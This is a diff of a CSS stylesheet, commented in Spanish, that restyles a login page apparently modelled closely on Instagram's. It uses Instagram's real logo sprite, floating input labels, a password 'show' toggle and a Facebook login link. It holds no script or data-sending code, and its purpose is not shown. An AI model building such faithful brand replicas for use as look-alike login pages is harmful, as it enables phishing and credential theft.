@@ -37,27 +37,24 @@ main {
     background-size: contain;
     background-repeat: no-repeat;
     background-position: center;
-    height: 780px;
-    flex-basis: 580px;
+    height: 450px;
+    flex-basis: 550px;
     display: none; 
 }
 
 @media (min-width: 876px) {
     .phones-image {
         display: block;
-	
     }
-	
 }
 
 @media (max-width: 480px) {
-	.form-section {
-	margin-bottom: 200px;
-		
-	}
+    .form-section {
+        margin-bottom: 200px;
+    }
 }
 
-/* --- Sección del Formulario --- */
+/* --- Sección del Formulario (LADO DERECHO) --- */
 .form-section {
     flex-basis: 350px;
     display: flex;
@@ -76,36 +73,129 @@ main {
     padding: 40px;
 }
 
-.logo {
-    font-family: 'Grand Hotel', cursive;
-    font-size: 3rem;
-    margin-bottom: 32px;
-    margin-top: 10px;
+.logo-container {
+    margin-top: 36px;
+    margin-bottom: 12px;
+    display: flex;
+    justify-content: center;
+    width: 100%;
 }
+
+.logo-img {
+    background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png");
+    background-position: 0px -2959px;
+    background-size: auto;
+    background-color: white;
+    width: 175px;
+    height: 54px;
+    background-repeat: no-repeat;
+    display: inline-block;
+}
+
+/* --- AQUÍ COMIENZAN LOS CAMBIOS DEL FORMULARIO --- */
 
 .login-form {
     display: flex;
     flex-direction: column;
     width: 100%;
-    gap: 6px;
+    /* Quitamos el gap global porque usaremos margin en los wrappers */
+    gap: 0; 
 }
 
-.input-field {
+/* Nuevo contenedor para cada input + label */
+.input-wrapper {
+    position: relative;
+    width: 100%;
+    height: 38px;
+    margin-bottom: 6px;
     background-color: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
-    padding: 9px 8px;
-    font-size: 12px;
-    width: 100%;
-    outline: none;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
 }
 
-.input-field:focus {
+/* Cuando estamos en el contenedor, el input ocupa todo el espacio */
+.input-field {
+    background: transparent;
+    border: none;
+    width: 100%;
+    height: 100%;
+    padding: 14px 8px 2px 8px; /* Espacio para que el texto pequeño quepa arriba */
+    font-size: 12px;
+    outline: none;
+    z-index: 2; /* Para que el texto que escribes quede sobre el label */
+}
+
+/* Estilo del texto "placeholder" que flota */
+.floating-label {
+    position: absolute;
+    left: 8px;
+    right: 8px; /* Para que no se salga */
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 12px;
+    color: #8e8e8e;
+    pointer-events: none; /* Permite clickear a través del texto */
+    transition: all 0.1s ease-out;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    z-index: 1;
+}
+
+/* LA MAGIA: Cuando el input tiene foco O texto, el label sube */
+.input-field:focus + .floating-label,
+.input-field:not(:placeholder-shown) + .floating-label {
+    transform: translateY(0);
+    top: 2px; /* Se pega arriba */
+    font-size: 10px; /* Se hace pequeño */
+}
+
+/* Ajustes específicos para el contenedor de contraseña */
+.password-container {
+    /* Hereda estilos de input-wrapper pero añade flex row para el botón */
+    display: flex;
+    flex-direction: row; 
+    align-items: center;
+}
+
+/* Espacio extra a la derecha en el input de password para que no choque con "Mostrar" */
+.password-container .input-field {
+    padding-right: 50px; 
+}
+
+/* Botón Mostrar */
+#togglePassword {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 14px;
+    color: #262626;
+    user-select: none;
+    display: none; /* JS debe mostrarlo cuando haya texto */
+    z-index: 3;
+}
+
+#togglePassword:hover {
+    color: #8e8e8e;
+}
+
+/* Borde al hacer foco en el contenedor completo */
+.input-wrapper:focus-within {
     border: 1px solid #a8a8a8;
 }
 
+/* --- FIN DE CAMBIOS DEL FORMULARIO --- */
+
 .login-button {
-    background-color: #4150f7; /* Tu color azul original */
+    background-color: #4150f7;
     color: #fff;
     border: none;
     border-radius: 8px;
@@ -113,7 +203,7 @@ main {
     font-size: 14px;
     font-weight: 600;
     cursor: pointer;
-    margin-top: 15px;
+    margin-top: 8px; /* Ajustado ligeramente */
     margin-bottom: 15px;
     height: 32px;
     width: 100%;
@@ -139,7 +229,7 @@ main {
     color: #8e8e8e;
 }
 
-/* --- Estilos actualizados para Facebook SVG --- */
+/* --- Facebook y Links --- */
 .facebook-login {
     display: flex;
     align-items: center;
@@ -153,16 +243,15 @@ main {
 
 .fb-icon {
     margin-right: 8px;
-    /* fill="currentColor" en HTML hace que herede el color #385185 */
 }
 
 .forgot-password {
-    color:black ;
-    font-size: 14px;
-    font-weight: 600;
+    color: #00376b; /* Corregido a azul oscuro típico, antes era black */
+    font-size: 12px;
     text-decoration: none;
     margin-top: 12px;
 }
+
 .forgot-password:hover {
     text-decoration: underline;
 }
@@ -224,77 +313,22 @@ footer {
 
 /* --- Estilos Funcionales (JS) --- */
 
-/* Botón desactivado */
 .login-button:disabled {
-    background-color: #7b86fa; /* Tu color desactivado */
+    background-color:#8081FF;
+    color: white;
     cursor: default;
+    opacity: 1;
 }
 
-/* Mensajes de error */
 .error-msg {
     color: #ed4956;
     font-size: 14px;
     text-align: center;
-    margin-bottom: 10px;
+    margin: 10px 0;
     display: none;
 }
 
-/* Animación de carga */
 .login-button.loading {
     opacity: 0.7;
     cursor: wait;
-}
-
-/* --- NUEVO: Input Password con botón Mostrar --- */
-.password-container {
-    position: relative;
-    width: 100%;
-    display: flex;
-    align-items: center;
-}
-
-/* Espacio extra en el input para que el texto no choque con el botón */
-.password-container .input-field {
-    padding-right: 60px; 
-}
-
-#togglePassword {
-    position: absolute;
-    right: 10px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    cursor: pointer;
-    font-weight: 600;
-    font-size: 14px;
-    color: #262626;
-    user-select: none;
-    display: none; /* Oculto por defecto si no hay texto */
-}
-
-#togglePassword:hover {
-    color: #8e8e8e;
-}
-
-/* --- En tu style.css --- */
-
-.logo-container {
-    margin-top: 36px;
-    margin-bottom: 12px;
-    display: flex;
-    justify-content: center;
-    width: 100%;
-}
-
-.logo-img {
-    /* Aquí pegué TU CÓDIGO exactamente */
-    background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png");
-    background-position: 0px -2959px;
-    background-size: auto;
-	background-color: white;
-    width: 175px;
-    height: 54px;
-    background-repeat: no-repeat;
-    display: inline-block;
 }
